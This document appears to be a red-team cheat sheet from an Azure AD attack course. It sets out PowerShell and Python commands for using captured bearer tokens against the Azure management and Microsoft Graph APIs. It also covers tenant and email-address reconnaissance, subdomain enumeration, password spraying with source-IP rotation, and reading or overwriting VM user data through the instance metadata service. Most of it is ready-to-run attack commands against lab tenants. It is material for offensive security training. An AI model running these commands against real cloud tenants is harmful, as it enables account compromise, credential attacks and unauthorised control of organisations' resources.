# Commands 
##  Some Microsoft Portals
https://msportals.io/ 


# Using Tokens with APIs - ARM
- Subscription ID
```powershell
$Token = 'eyJ0eXAi.......'
$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
$RequestParams = @{
	Method = 'GET'
	Uri = $URI
	Headers = @{
		'Authorization' = "Bearer $Token"
	}
}

(Invoke-RestMethod @RequestParams).value
```
- List all resources accessible for the managed identity assigned to the app service. 
```powershell
$Token = 'eyJ0eX..' 
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049- 8c11-d52d5d388768/resources?api-version=2020-10-01' 
$RequestParams = @{ 
	Method = 'GET' 
	Uri = $URI 
	Headers = @{ 
		'Authorization' = "Bearer $Token" 
	} 
} 
(Invoke-RestMethod @RequestParams).value
```
- Let's see what actions are allowed using the below code:
```powershell
$Token = 'eyJ0eX..' 
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049- 8c11- d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/vir tualMachines/bkpadconnect/providers/Microsoft.Authorization/permissions ?api-version=2015-07-01' 
$RequestParams = @{
	Method = 'GET' 
	Uri = $URI 
	Headers = @{
		'Authorization' = "Bearer $Token"
	} 
} 
(Invoke-RestMethod @RequestParams).value
```

# Using Tokens with APIs - MS Graph
```powershell
$Token = 'eyJ0eXAi..' 
$URI = 'https://graph.microsoft.com/v1.0/users' 
$RequestParams = @{ 
	Method = 'GET' 
	Uri = $URI 
	Headers = @{ 
		'Authorization' = "Bearer $Token" 
		} 
	} 

(Invoke-RestMethod @RequestParams).value
```
 
# Discovery And Recon - Azure Tenant
 Get if Azure tenant is in use, tenant name and Federation
 ```
 https://login.microsoftonline.com/getuserrealm.srf?login=%5bUSERNAME@DOMAIN%5d&xml=1
 ```
 Get the Tenant ID
 ```
 https://login.microsoftonline.com/%5bDOMAIN%5d/.well-known/openid-configuration
 ```
 Validate Email ID by sending requests to
 ```
 https://login.microsoftonline.com/common/GetCredentialType
 ```

# AADInternals tool
https://github.com/Gerenios/AADInternals
It is a PowerShell module that we will use for multiple attacks against AzureAD.
```powershell
Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1 -Verbose
```
Get tenant ID
```powershell
Get-AADIntTenantID -Domain defcorphq.onmicrosoft.com
```
Get tenant domains 
```powershell
Get-AADIntTenantDomains -Domain defcorphq.onmicrosoft.com
Get-AADIntTenantDomains -Domain deffin.onmicrosoft.com
```
Get all the information
```powershell
Invoke-AADIntReconAsOutsider -DomainName defcorphq.onmicrosoft.com
```

# Discovery and Recon - Email IDs
o365creeper  https://github.com/LMGsec/o365creeper
It makes requests to the GetCredentialType API
```python
C:\Python27\python.exe
C:\AzAD\Tools\o365creeper\o365creeper.py -f
C:\AzAD\Tools\emails.txt -o
C:\AzAD\Tools\validemails.txt
```

# Discovery and Recon - Azure Services
Azure services are available at specific domains and subdomains
We can enumerate if the target organization is using any of the services by looking for such subdomains.

MicroBurst https://github.com/NetSPI/MicroBurst 

MicroBurst uses Az, AzureAD, AzurRM and MSOL tools and additional REST API calls.
```powershell
Import-Module C:\AzAD\Tools\MicroBurst\MicroBurst.psm1 -Verbose
```
Enumerate all subdomains for an organization specified using the `-Base` parameter;
```powershell
Invoke-EnumerateAzureSubDomains -Base defcorphq -Verbose
```

# Brute-Force with MSOL Spray
Password Spray/Brute-Force
MSOLSpray supports fireprox to rotate source IP address on auth request.

MSOLSpray https://github.com/dafthack/MSOLSpray
Fireprox https://github.com/ustayready/fireprox



# Azure VMs_User Data_Abuse
- Retrieve User Data
```powershell
$userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userdata?api-version=2021-01-01&format=test"

[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
```

- Modify User Data
```powershell
$data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("whoami"))
$accesstoken = (Get-AccessToken).Token
$url = "https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-
d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm?api-version=2021-07-01"
$body = @{
	@{
		location = "Germany West Central"
		properties = @{
			userData = "$data"
		}
	}
} | ConvertTo-Json -Dept 4

$headers = @{
	Authorization = "Bearer $accesstoken"
}

#Execute Rest API Call
$Results = Invoke-RestMethod -Method Put -Uri $url -Body $body -Headers $headers -ContentType 'application/json'
```